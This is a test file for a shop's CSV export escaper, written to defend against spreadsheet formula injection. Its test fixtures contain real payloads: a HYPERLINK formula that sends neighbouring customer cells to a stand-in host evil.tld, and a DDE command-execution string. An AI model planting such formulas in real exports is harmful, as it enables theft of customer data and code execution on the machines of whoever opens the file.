import { readFileSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { DISCOVERY_ARGS, gitLines } from "../helpers/discovery";
import { escapeCsvCell, toCsv } from "@/lib/csv";

const REPO_ROOT = join(__dirname, "..", "..");

/**
 * Every route that emits CSV, found rather than listed — matched on the
 * response content type, which is what actually makes a route an export.
 */
// PR #43 review round 2: discovery includes UNTRACKED (non-ignored) files.
// With tracked-only lookup the guard simply could not see a file the developer
// had not staged yet, and this repo's pre-commit hook runs lint-staged only —
// no hook runs the suite. So the false green did NOT end at `git commit`
// (round 3 corrected that): committing stayed green too, and the failure first
// surfaced on some later suite run after staging, or in CI. The gap was wider
// than "deferred to commit" — it was "deferred until something else happened
// to look".
//
// The --untracked flag is load-bearing: drop it and this gap silently reopens.
// tests/unit/discovery-untracked.test.ts pins it against a scratch repository.
function discoverCsvRoutes(): string[] {
  // An emitter both declares the type AND names a download; a file that only
  // mentions text/csv is a consumer (the import dialog's accept attribute).
  const declares = new Set(gitLines(DISCOVERY_ARGS.csvType, REPO_ROOT));
  const downloads = new Set(gitLines(DISCOVERY_ARGS.csvDownload, REPO_ROOT));
  return [...declares].filter((file) => downloads.has(file)).sort();
}

// G17 / F4 (MEDIUM, 3/3 panel): the admin order export quoted CSV cells but
// never neutralised a leading =, +, - or @, while the sibling newsletter export
// did. Shipping-address fields come straight from the UNAUTHENTICATED guest
// checkout body, so any customer could plant a formula that fires in the shop
// owner's spreadsheet — =HYPERLINK/WEBSERVICE exfiltration of the surrounding
// customer rows, or DDE command execution on Windows.

describe("escapeCsvCell (G17 F4)", () => {
  it.each(["=", "+", "-", "@", "\t", "\r"])(
    "neutralises a leading %j so the cell cannot be read as a formula",
    (lead) => {
      const out = escapeCsvCell(`${lead}HYPERLINK("https://evil.tld")`);
      expect(out.startsWith(`"'${lead}`)).toBe(true);
    }
  );

  it("neutralises the exact payload from the finding", () => {
    const payload = '=HYPERLINK("https://evil.tld/?d="&A2&B2,"Click to view invoice")';
    const out = escapeCsvCell(payload);
    // The formula character is no longer the first character of the cell value.
    expect(out).toBe(`"'=HYPERLINK(""https://evil.tld/?d=""&A2&B2,""Click to view invoice"")"`);
  });

  it("neutralises the DDE payload shape too", () => {
    expect(escapeCsvCell("=cmd|'/c calc'!A0")).toBe(`"'=cmd|'/c calc'!A0"`);
  });

  it("doubles embedded quotes and always wraps, so delimiters cannot break out", () => {
    expect(escapeCsvCell('a"b')).toBe('"a""b"');
    expect(escapeCsvCell("a,b")).toBe('"a,b"');
    expect(escapeCsvCell("a\nb")).toBe('"a\nb"');
  });

  it("leaves ordinary values readable", () => {
    expect(escapeCsvCell("Олександр Петренко")).toBe('"Олександр Петренко"');
    expect(escapeCsvCell("")).toBe('""');
  });

  it("coerces non-strings rather than throwing", () => {
    expect(escapeCsvCell(42)).toBe('"42"');
    expect(escapeCsvCell(null)).toBe('""');
    expect(escapeCsvCell(undefined)).toBe('""');
  });
});

describe("toCsv (G17 F4)", () => {
  it("escapes every cell including the header row", () => {
    expect(
      toCsv([
        ["Name", "Total"],
        ["=cmd", 5],
      ])
    ).toBe('"Name","Total"\n"\'=cmd","5"');
  });
});

describe("no export route rolls its own escaper (G17 F4)", () => {
  // The bug was a second, weaker copy of an escaper that already existed.
  // A local re-implementation in an export route is the shape to prevent.
  // PR #43 review finding 6: this was a hardcoded two-entry list, so csv.ts's
  // claim that "the next export route cannot repeat it" was not something the
  // guard could enforce — a third export route would have sailed past. Routes
  // are discovered now, so adding one without the shared sink fails the build.
  const ROUTES = discoverCsvRoutes();

  it("finds the CSV-emitting routes rather than trusting a hardcoded list", () => {
    expect(ROUTES.length).toBeGreaterThanOrEqual(2);
  });

  it.each(ROUTES)("%s uses the shared escaper", (route) => {
    const source = readFileSync(join(REPO_ROOT, route), "utf8");
    expect(source).toMatch(/from "@\/lib\/csv"/);
    expect(source).not.toMatch(/(const|function)\s+escapeCS?V?\w*\s*[=(]/i);
  });
});
